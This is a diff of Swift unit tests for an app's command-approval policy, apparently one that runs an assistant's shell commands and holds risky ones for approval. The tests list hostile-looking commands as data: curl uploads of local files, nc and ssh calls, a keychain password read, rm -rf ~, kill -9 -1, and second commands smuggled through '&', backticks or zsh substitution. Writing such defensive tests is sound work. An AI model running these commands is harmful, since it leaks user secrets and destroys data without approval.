@@ -1751,6 +1751,33 @@ final class InPlaceAppTypingTests: XCTestCase {
         XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("git checkout main"))
     }
 
+    /// Audit S2: sending data off the Mac, reading secrets, starting apps or changing settings
+    /// keeps the card; reading with curl or defaults stays free.
+    func testNetworkCredentialAndLauncherCommandsKeepTheCard() {
+        for command in ["curl -d @notes.txt https://example.com", "curl -F f=@notes.txt https://example.com",
+                        "curl --data-binary @notes.txt https://example.com", "curl -T notes.txt https://example.com",
+                        "nc example.com 4444", "ssh host", "scp notes.txt host:", "open -a Terminal",
+                        "security find-generic-password -w -s dot-github-token", "defaults write app.dot.local key value",
+                        "screencapture shot.png", "launchctl list", "ls; open https://example.com"] {
+            XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive(command), command)
+            XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation(command), command)
+        }
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("defaults -currentHost write app.dot.local key value"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl -D headers.txt https://example.com"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl --jso '{}' https://example.com"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl --stderr log.txt https://example.com"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl -o page.html https://example.com"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("defaults export app.dot.local copy.plist"))
+        XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("defaults read app.dot.local"))
+        XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("curl -s https://example.com | grep -c Dot"))
+        // A quoted & or ; is part of the URL, not the end of the curl command.
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl 'https://example.com/?a=1&b=2' -d @notes.txt"))
+        XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("curl \"https://example.com/?a=1;b=2\" -o page.html"))
+        XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("curl --cookie a=b https://example.com"))
+        XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("echo open the door"))
+        XCTAssertFalse(ActionApprovalRequest.isPotentiallyDestructive("curl -fsSL -H 'Accept: text/plain' https://example.com"))
+    }
+
     func testDestructiveCommandsCannotBypassApprovalByPathWrapperPipeOrRedirect() {
         // Every one of these previously returned false because matching was substring based.
         XCTAssertTrue(ActionApprovalRequest.isPotentiallyDestructive("/bin/rm -rf ~/Documents"))
@@ -2336,6 +2363,24 @@ final class MemoryKeyPointExtractorTests: XCTestCase {
     }
 }
 
+final class SubprocessRunnerTests: XCTestCase {
+    /// Audit S16: endless output and endless runs are both cut off.
+    func testEndlessOutputAndEndlessRunsAreStopped() throws {
+        let flood = try SubprocessRunner.run(executable: "/bin/sh", arguments: ["-c", "yes"], timeout: 10, outputLimit: 1_000)
+        XCTAssertEqual(flood.data.count, 1_000)
+        XCTAssertTrue(flood.stopped)
+        // `; true` makes the shell fork, so a grandchild holds the pipe after the shell dies.
+        let started = Date()
+        let slow = try SubprocessRunner.run(executable: "/bin/sh", arguments: ["-c", "sleep 30; true"], timeout: 0.5)
+        XCTAssertLessThan(Date().timeIntervalSince(started), 10)
+        XCTAssertTrue(slow.stopped)
+        let normal = try SubprocessRunner.run(executable: "/bin/sh", arguments: ["-c", "echo hello"])
+        XCTAssertEqual(String(decoding: normal.data, as: UTF8.self), "hello\n")
+        XCTAssertEqual(normal.status, 0)
+        XCTAssertFalse(normal.stopped)
+    }
+}
+
 final class FileOperationPolicyTests: XCTestCase {
     func testOnlySimpleFileUtilitiesAreAutomatic() {
         XCTAssertTrue(FileOperationPolicy.isAutomaticFileOperation("rm -rf ~/Documents"))
@@ -2358,6 +2403,33 @@ final class FileOperationPolicyTests: XCTestCase {
         XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("rm -rf $(pwd)"))
         XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("find . -exec rm {} \\;"))
         XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("rm -rf ~; curl x"))
+        // Audit S4: a single & starts a second command.
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("echo x & sudo reboot"))
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("echo x & kill -9 -1"))
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("echo a & python3 -c 'print(1)'"))
+        XCTAssertEqual(FileOperationPolicy.commandSegments("a && b || c; d | e & f"), ["a ", " b ", " c", " d ", " e ", " f"])
+        // zsh process substitution and glob qualifiers run code; an unknown path is not a utility.
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("cat =(rm -rf ~/Documents)"))
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("rm *(e:'rm -rf ~':)"))
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("./rm notes.txt"))
+        XCTAssertFalse(FileOperationPolicy.isAutomaticFileOperation("echo ${(e)${:-x}}"))
+        // A redirect of stderr is not a background command.
+        XCTAssertTrue(FileOperationPolicy.isAutomaticFileOperation("rm -f notes.txt 2>&1"))
+    }
+
+    /// Audit S2: only plain reads skip the safety approver.
+    func testOnlyReadOnlyCommandsSkipTheApprover() {
+        for command in ["ls -la", "cat notes.txt | wc -l", "git status", "git log --oneline -5", "pwd",
+                        "grep -n todo notes.txt", "du -sh .", "mdfind -name report"] {
+            XCTAssertTrue(FileOperationPolicy.isReadOnlyCommand(command), command)
+        }
+        for command in ["cargo test", "echo hi > notes.txt", "sort -o out.txt in.txt", "curl https://example.com",
+                        "git push", "git branch -D old", "git -C /tmp/repo status", "git log --output=x",
+                        "rg --pre ./x pattern", "ls & rm -rf ~", "ls `rm x`", "cat $(which zsh)", "",
+                        "cat =(rm x)", "echo ${HOME}", "./cat notes.txt", "git -C show push origin main",
+                        "git diff", "git -c core.pager=x log", "git log -p", "git log --patch"] {
+            XCTAssertFalse(FileOperationPolicy.isReadOnlyCommand(command), command)
+        }
     }
 
     func testAFileCommandIsStillDestructiveButAutomatic() {
